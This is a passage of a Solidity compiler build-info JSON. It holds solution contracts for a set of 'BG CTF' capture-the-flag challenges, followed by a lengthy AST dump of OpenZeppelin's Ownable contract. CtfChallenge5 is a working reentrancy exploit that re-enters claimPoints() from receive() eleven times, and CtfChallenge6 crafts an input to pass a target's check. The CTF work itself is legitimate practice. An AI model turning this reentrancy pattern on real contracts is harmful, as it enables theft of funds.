\"@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol\";\nimport \"@openzeppelin/contracts/utils/cryptography/ECDSA.sol\";\n\ncontract CtfChallenge4 {\n    using ECDSA for bytes32;\n    using MessageHashUtils for bytes32;\n\n    event HashCalculated(bytes32 theHash);\n\n    function mintFlag() public returns (bytes32) {\n\n        bytes32 message = keccak256(abi.encode(\"BG CTF Challenge 4\", msg.sender));\n        bytes32 hash = message.toEthSignedMessageHash();\n\n        emit HashCalculated(hash);\n\n        return hash;\n\n    }\n}\n"},"contracts/CtfChallenge5.sol":{"content":"// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.28;\n\ncontract CtfChallenge5 {\n    IChallenge5 public challenge;\n    uint256 public callCount;\n    uint256 public constant TARGET = 11;\n\n    event recieveCalled();\n    event fallbackCalled();\n\n    constructor(address _challengeAddress) {\n        challenge = IChallenge5(_challengeAddress);\n    }\n\n    function startClaim() external {\n        callCount = 0;\n        challenge.claimPoints();\n    }\n\n    receive() external payable {\n        // emit recieveCalled();\n        if (callCount < TARGET) {\n            callCount++;\n            challenge.claimPoints();\n        }\n    }\n\n    fallback() external {\n        // emit fallbackCalled();       // if (callCount < TARGET) {\n        //     callCount++;\n        //     challenge.claimPoints();\n        // } else if (callCount == TARGET) {\n        //     callCount++;\n        //     challenge.mintFlag();\n        // }\n    }\n}\n\n\ninterface IChallenge5 {\n    function claimPoints() external;\n    function mintFlag() external;\n    function resetPoints() external;\n}"},"contracts/CtfChallenge6.sol":{"content":"// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.28;\n\ncontract CtfChallenge6 {\n    IChallenge6 public challenge;\n    string public name;\n\n\n    constructor(address _challengeAddress) {\n        challenge = IChallenge6(_challengeAddress);\n        name = \"BG CTF Challenge 6 Solution\";\n    }\n\n    function startMint() external {\n        uint256 count = challenge.count();\n        challenge.mintFlag(count << 8);\n    }\n}\n\n\ninterface IChallenge6 {\n    function count() external view returns (uint256);\n    function mintFlag(uint256 _count) external;\n}"}},"settings":{"evmVersion":"paris","optimizer":{"enabled":false,"runs":200},"outputSelection":{"*":{"*":["abi","evm.bytecode","evm.deployedBytecode","evm.methodIdentifiers","metadata","devdoc","userdoc","storageLayout","evm.gasEstimates"],"":["ast"]}},"metadata":{"useLiteralContent":true}}},"output":{"sources":{"@openzeppelin/contracts/access/Ownable.sol":{"ast":{"absolutePath":"@openzeppelin/contracts/access/Ownable.sol","exportedSymbols":{"Context":[177],"Ownable":[147]},"id":148,"license":"MIT","nodeType":"SourceUnit","nodes":[{"id":1,"literals":["solidity","^","0.8",".20"],"nodeType":"PragmaDirective","src":"102:24:0"},{"absolutePath":"@openzeppelin/contracts/utils/Context.sol","file":"../utils/Context.sol","id":3,"nameLocation":"-1:-1:-1","nodeType":"ImportDirective","scope":148,"sourceUnit":178,"src":"128:45:0","symbolAliases":[{"foreign":{"id":2,"name":"Context","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":177,"src":"136:7:0","typeDescriptions":{}},"nameLocation":"-1:-1:-1"}],"unitAlias":""},{"abstract":true,"baseContracts":[{"baseName":{"id":5,"name":"Context","nameLocations":["692:7:0"],"nodeType":"IdentifierPath","referencedDeclaration":177,"src":"692:7:0"},"id":6,"nodeType":"InheritanceSpecifier","src":"692:7:0"}],"canonicalName":"Ownable","contractDependencies":[],"contractKind":"contract","documentation":{"id":4,"nodeType":"StructuredDocumentation","src":"175:487:0","text":" @dev Contract module which provides a basic access control mechanism, where\n there is an account (an owner) that can be granted exclusive access to\n specific functions.\n The initial owner is set to the address provided by the deployer. This can\n later be changed with {transferOwnership}.\n This module is used through inheritance. It will make available the modifier\n `onlyOwner`, which can be applied to your functions to restrict their use to\n the owner."},"fullyImplemented":true,"id":147,"linearizedBaseContracts":[147,177],"name":"Ownable","nameLocation":"681:7:0","nodeType":"ContractDefinition","nodes":[{"constant":false,"id":8,"mutability":"mutable","name":"_owner","nameLocation":"722:6:0","nodeType":"VariableDeclaration","scope":147,"src":"706:22:0","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":7,"name":"address","nodeType":"ElementaryTypeName","src":"706:7:0","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"private"},{"documentation":{"id":9,"nodeType":"StructuredDocumentation","src":"735:85:0","text":" @dev The caller account is not authorized to perform an operation."},"errorSelector":"118cdaa7","id":13,"name":"OwnableUnauthorizedAccount","nameLocation":"831:26:0","nodeType":"ErrorDefinition","parameters":{"id":12,"nodeType":"ParameterList","parameters":[{"constant":false,"id":11,"mutability":"mutable","name":"account","nameLocation":"866:7:0","nodeType":"VariableDeclaration","scope":13,"src":"858:15:0","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":10,"name":"address","nodeType":"ElementaryTypeName","src":"858:7:0","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"857:17:0"},"src":"825:50:0"},{"documentation":{"id":14,"nodeType":"StructuredDocumentation","src":"881:82:0","text":" @dev The owner is not a valid owner account. (eg. `address(0)`)"},"errorSelector":"1e4fbdf7","id":18,"name":"OwnableInvalidOwner","nameLocation":"974:19:0","nodeType":"ErrorDefinition","parameters":{"id":17,"nodeType":"ParameterList","parameters":[{"constant":false,"id":16,"mutability":"mutable","name":"owner","nameLocation":"1002:5:0","nodeType":"VariableDeclaration","scope":18,"src":"994:13:0","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":15,"name":"address","nodeType":"ElementaryTypeName","src":"994:7:0","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"993:15:0"},"src":"968:41:0"},{"anonymous":false,"eventSelector":"8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0","id":24,"name":"OwnershipTransferred","nameLocation":"1021:20:0","nodeType":"EventDefinition","parameters":{"id":23,"nodeType":"ParameterList","parameters":[{"constant":false,"id":20,"indexed":true,"mutability":"mutable","name":"previousOwner","nameLocation":"1058:13:0","nodeType":"VariableDeclaration","scope":24,"src":"1042:29:0","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":19,"name":"address","nodeType":"ElementaryTypeName","src":"1042:7:0","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":22,"indexed":true,"mutability":"mutable","name":"newOwner","nameLocation":"1089:8:0","nodeType":"VariableDeclaration","scope":24,"src":"1073:24:0","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":21,"name":"address","nodeType":"ElementaryTypeName","src":"1073:7:0","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"1041:57:0"},"src":"1015:84:0"},{"body":{"id":49,"nodeType":"Block","src":"1259:153:0","statements":[{"condition":{"commonType":{"typeIdentifier":"t_address","typeString":"address"},"id":35,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":30,"name":"initialOwner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":27,"src":"1273:12:0","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"arguments":[{"hexValue":"30","id":33,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"1297:1:0","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":32,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"1289:7:0","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":31,"name":"address","nodeType":"ElementaryTypeName","src":"1289:7:0","typeDescriptions":{}}},"id":34,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"1289:10:0","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"src":"1273:26:0","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":44,"nodeType":"IfStatement","src":"1269:95:0","trueBody":{"id":43,"nodeType":"Block","src":"1301:63:0","statements":[{"errorCall":{"arguments":[{"arguments":[{"hexValue":"30","id":39,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"1350:1:0","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":38,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"1342:7:0","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":37,"name":"address","nodeType":"ElementaryTypeName","src":"1342:7:0","typeDescriptions":{}}},"id":40,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"1342:10:0","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"}],"id":36,"name":"OwnableInvalidOwner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":18,"src":"1322:19:0","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_address_$returns$_t_error_$","typeString":"function (address) pure returns (error)"}},"id":41,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"1322:31:0","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":42,"nodeType":"RevertStatement","src":"1315:38:0"}]}},{"expression":{"arguments":[{"id":46,"name":"initialOwner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":27,"src":"1392:12:0","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"}],"id":45,"name":"_transferOwnership","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":146,"src":"1373:18:0","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$_t_address_$returns$__$","typeString":"function (address)"}},"id":47,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"1373:32:0","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":48,"nodeType":"ExpressionStatement","src":"1373:32:0"}]},"documentation":{"id":25,"nodeType":"StructuredDocumentation","src":"1105:115:0","text":" @dev Initializes the contract setting the address provided by the deployer as the initial owner."},"id":50,"implemented":true,"kind":"constructor","modifiers":[],"name":"","nameLocation":"-1:-1:-1","nodeType":"FunctionDefinition","parameters":{"id":28,"nodeType":"ParameterList","parameters":[{"constant":false,"id":27,"mutability":"mutable","name":"initialOwner","nameLocation":"1245:12:0","nodeType":"VariableDeclaration","scope":50,"src":"1237:20:0","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":26,"name":"address","nodeType":"ElementaryTypeName","src":"1237:7:0","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"1236:22:0"},"returnParameters":{"id":29,"nodeType":"ParameterList","parameters":[],"src":"1259:0:0"},"scope":147,"src":"1225:187:0","stateMutability":"nonpayable","virtual":false,"visibility":"internal"},{"body":{"id":57,"nodeType":"Block","src":"1521:41:0","statements":[{"expression":{"arguments":[],"expression":{"argumentTypes":[],"id":53,"name":"_checkOwner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":84,"src":"1531:11:0","typeDescriptions":{"typeIdentifier":"t_function_internal_view$__$returns$__$","typeString":"function () view"}},"id":54,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"1531:13:0","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":55,"nodeType":"ExpressionStatement","src":"1531:13:0"},{"id":56,"nodeType":"PlaceholderStatement","src":"1554:1:0"}]},"documentation":{"id":51,"nodeType":"StructuredDocumentation","src":"1418:77:0","text":" @dev Throws if called by any account other than the owner."},"id":58,"name":"onlyOwner","nameLocation":"1509:9:0","nodeType":"ModifierDefinition","parameters":{"id":52,"nodeType":"ParameterList","parameters":[],"src":"1518:2:0"},"src":"1500:62:0","virtual":false,"visibility":"internal"},{"body":{"id":66,"nodeType":"Block","src":"1693:30:0","statements":[{"expression":{"id":64,"name":"_owner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":8,"src":"1710:6:0","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"functionReturnParameters":63,"id":65,"nodeType":"Return","src":"1703:13:0"}]},"documentation":{"id":59,"nodeType":"StructuredDocumentation","src":"1568:65:0","text":" @dev Returns the address of the current owner."},"functionSelector":"8da5cb5b","id":67,"implemented":true,"kind":"function","modifiers":[],"name":"owner","nameLocation":"1647:5:0","nodeType":"FunctionDefinition","parameters":{"id":60,"nodeType":"ParameterList","parameters":[],"src":"1652:2:0"},"returnParameters":{"id":63,"nodeType":"ParameterList","parameters":[{"constant":false,"id":62,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":67,"src":"1684:7:0","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":61,"name":"address","nodeType":"ElementaryTypeName","src":"1684:7:0","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"1683:9:0"},"scope":147,"src":"1638:85:0","stateMutability":"view","virtual":true,"visibility":"public"},{"body":{"id":83,"nodeType":"Block","src":"1841:117:0","statements":[{"condition":{"commonType":{"typeIdentifier":"t_address","typeString":"address"},"id":75,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[],"expression":{"argumentTypes":[],"id":71,"name":"owner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":67,"src":"1855:5:0","typeDescriptions":{"typeIdentifier":"t_function_internal_view$__$returns$_t_address_$","typeString":"function () view returns (address)"}},"id":72,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"1855:7:0","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"arguments":[],"expression":{"argumentTypes":[],"id":73,"name":"_msgSender","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":159,"src":"1866:10:0","typeDescriptions":{"typeIdentifier":"t_function_internal_view$__$returns$_t_address_$","typeString":"function () view returns (address)"}},"id":74,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"1866:12:0","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"src":"1855:23:0","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":82,"nodeType":"IfStatement","src":"1851:101:0","trueBody":{"id":81,"nodeType":"Block","src":"1880:72:0","statements":[{"errorCall":{"arguments":[{"arguments":[],"expression":{"argumentTypes":[],"id":77,"name":"_msgSender","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":159,"src":"1928:10:0","typeDescriptions":{"typeIdentifier":"t_function_internal_view$__$returns$_t_address_$","typeString":"function () view returns (address)"}},"id":78,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"1928:12:0","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"}],"id":76,"name":"OwnableUnauthorizedAccount","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":13,"src":"1901:26:0","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_address_$returns$_t_error_$","typeString":"function (address) pure returns (error)"}},"id":79,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"1901:40:0","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":80,"nodeType":"RevertStatement","src":"1894:47:0"}]}}]},"documentation":{"id":68,"nodeType":"StructuredDocumentation","src":"1729:62:0","text":" @dev Throws if the sender is not the owner."},"id":84,"implemented":true,"kind":"function","modifiers":[],"name":"_checkOwner","nameLocation":"1805:11:0","nodeType":"FunctionDefinition","parameters":{"id":69,"nodeType":"ParameterList","parameters":[],"src":"1816:2:0"},"returnParameters":{"id":70,"nodeType":"ParameterList","parameters":[],"src":"1841:0:0"},"scope":147,"src":"1796:162:0","stateMutability":"view","virtual":true,"visibility":"internal"},{"body":{"id":97,"nodeType":"Block","src":"2347:47:0","statements":[{"expression":{"arguments":[{"arguments":[{"hexValue":"30","id":93,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"2384:1:0","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":92,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"2376:7:0","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":91,"name":"address","nodeType":"ElementaryTypeName","src":"2376:7:0","typeDescriptions":{}}},"id":94,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"2376:10:0","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"}],"id":90,"name":"_transferOwnership","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":146,"src":"2357:18:0","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$_t_address_$returns$__$","typeString":"function (address)"}},"id":95,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"2357:30:0","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":96,"nodeType":"ExpressionStatement","src":"2357:30:0"}]},"documentation":{"id":85,"nodeType":"StructuredDocumentation","src":"1964:324:0","text":" @dev Leaves the contract without owner. It will not be possible to call\n `onlyOwner` functions. Can only be called by the current owner.\n NOTE: Renouncing ownership will leave the contract without an owner,\n thereby disabling any functionality that is only available to the owner."},"functionSelector":"715018a6","id":98,"implemented":true,"kind":"function","modifiers":[{"id":88,"kind":"modifierInvocation","modifierName":{"id":87,"name":"onlyOwner","nameLocations":["2337:9:0"],"nodeType":"IdentifierPath","referencedDeclaration":58,"src":"2337:9:0"},"nodeType":"ModifierInvocation","src":"2337:9:0"}],"name":"renounceOwnership","nameLocation":"2302:17:0","nodeType":"FunctionDefinition","parameters":{"id":86,"nodeType":"ParameterList","parameters":[],"src":"2319:2:0"},"returnParameters":{"id":89,"nodeType":"ParameterList","parameters":[],"src":"2347:0:0"},"scope":147,"src":"2293:101:0","stateMutability":"nonpayable","virtual":true,"visibility":"public"},{"body":{"id":125,"nodeType":"Block","src":"2613:145:0","statements":[{"condition":{"commonType":{"typeIdentifier":"t_address","typeString":"address"},"id":111,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":106,"name":"newOwner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":101,"src":"2627:8:0","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"arguments":[{"hexValue":"30","id":109,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"2647:1:0","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":108,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"2639:7:0","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":107,"name":"address","nodeType":"ElementaryTypeName","src":"2639:7:0","typeDescriptions":{}}},"id":110,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"2639:10:0","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"src":"2627:22:0","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":120,"nodeType":"IfStatement","src":"2623:91:0","trueBody":{"id":119,"nodeType":"Block","src":"2651:63:0","statements":[{"errorCall":{"arguments":[{"arguments":[{"hexValue":"30","id":115,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"2700:1:0","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":114,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"2692:7:0","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":113,"name":"address","nodeType":"ElementaryTypeName","src":"2692:7:0","typeDescriptions":{}}},"id":116,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"2692:10:0","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"}],"id":112,"name":"OwnableInvalidOwner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":18,"src":"2672:19:0","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_address_$returns$_t_error_$","typeString":"function (address) pure returns (error)"}},"id":117,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"2672:31:0","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":118,"nodeType":"RevertStatement","src":"2665:38:0"}]}},{"expression":{"arguments":[{"id":122,"name":"newOwner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":101,"src":"2742:8:0","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"}],"id":121,"name":"_transferOwnership","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":146,"src":"2723:18:0","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$_t_address_$returns$__$","typeString":"function (address)"}},"id":123,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"2723:28:0","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":124,"nodeType":"ExpressionStatement","src":"2723:28:0"}]},"documentation":{"id":99,"nodeType":"StructuredDocumentation","src":"2400:138:0","text":" @dev Transfers ownership of the contract to a new account (`newOwner`).\n Can only be called by the current owner."},"functionSelector":"f2fde38b","id":126,"implemented":true,"kind":"function","modifiers":[{"id":104,"kind":"modifierInvocation","modifierName":{"id":103,"name":"onlyOwner","nameLocations":["2603:9:0"],"nodeType":"IdentifierPath","referencedDeclaration":58,"src":"2603:9:0"},"nodeType":"ModifierInvocation","src":"2603:9:0"}],"name":"transferOwnership","nameLocation":"2552:17:0","nodeType":"FunctionDefinition","parameters":{"id":102,"nodeType":"ParameterList","parameters":[{"constant":false,"id":101,"mutability":"mutable","name":"newOwner","nameLocation":"2578:8:0","nodeType":"VariableDeclaration","scope":126,"src":"2570:16:0","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":100,"name":"address","nodeType":"ElementaryTypeName","src":"2570:7:0","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"2569:18:0"},"returnParameters":{"id":105,"nodeType":"ParameterList","parameters":[],"src":"2613:0:0"},"scope":147,"src":"2543:215:0","stateMutability":"nonpayable","virtual":true,"visibility":"public"},{"body":{"id":145,"nodeType":"Block","src":"2975:124:0","statements":[{"assignments":[133],"declarations":[{"constant":false,"id":133,"mutability":"mutable","name":"oldOwner","nameLocation":"2993:8:0","nodeType":"VariableDeclaration","scope":145,"src":"2985:16:0","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":132,"name":"address","nodeType":"ElementaryTypeName","src":"2985:7:0","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"id":135,"initialValue":{"id":134,"name":"_owner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":8,"src":"3004:6:0","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"VariableDeclarationStatement","src":"2985:25:0"},{"expression":{"id":138,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":136,"name":"_owner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":8,"src":"3020:6:0","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"id":137,"name":"newOwner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":129,"src":"3029:8:0","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"src":"3020:17:0","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"id":139,"nodeType":"ExpressionStatement","src":"3020:17:0"},{"eventCall":{"arguments":[{"id":141,"name":"oldOwner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":133,"src":"3073:8:0","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":142,"name":"newOwner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":129,"src":"3083:8:0","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_address","typeString":"address"}],"id":140,"name":"OwnershipTransferred","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":24,"src":"3052:20:0","typeDescriptions":{"typeIdentifier":"t_function_event_nonpayable$_t_address_$_t_address_$returns$__$","typeString":"function (address,address)"}},"id":143,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"3052:40:0","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":144,"nodeType":"EmitStatement","src":"3047:45:0"}]},"documentation":{"id":127,"nodeType":"StructuredDocumentation","src":"2764:143:0","text":" @dev Transfers ownership of the contract to a new account (`newOwner`).\n Internal function without access restriction."},"id":146,"implemented":true,"kind":"function","modifiers":[],"name":"_transferOwnership","nameLocation":"2921:18:0","nodeType":"FunctionDefinition","parameters":{"id":130,"nodeType":"ParameterList","parameters":[{"constant":false,"id":129,"mutability":"mutable","name":"newOwner","nameLocation":"2948:8:0","nodeType":"VariableDeclaration","scope":146,"src":"2940:16:0","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":128,"name":"address","nodeType":"ElementaryTypeName","src":"2940:7:0","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"2939:18:0"},"returnParameters":{"id":131,"nodeType":"ParameterList","parameters":[],"src":"2975:0:0"},"scope":147,"src":"2912:187:0","stateMutability":"nonpayable","virtual":true,"visibility":"internal"}],"scope":148,"src":"663:2438:0","usedErrors":[13,18],"usedEvents":[24]}],"src":"102:3000:0"},"id":0},"@openzeppelin/contracts/utils/Context.sol":{"ast":{"absolutePath":"@openzeppelin/contracts/utils/Context.sol","exportedSymbols":{"Context":[177]},"id":178,"license":"MIT","nodeType":"SourceUnit","nodes":[{"id":149,"literals":["solidity","^","0.8",".20"],"nodeType":"PragmaDirective","src":"101:24:1"},{"abstract":true,"baseContracts":[],"canonicalName":"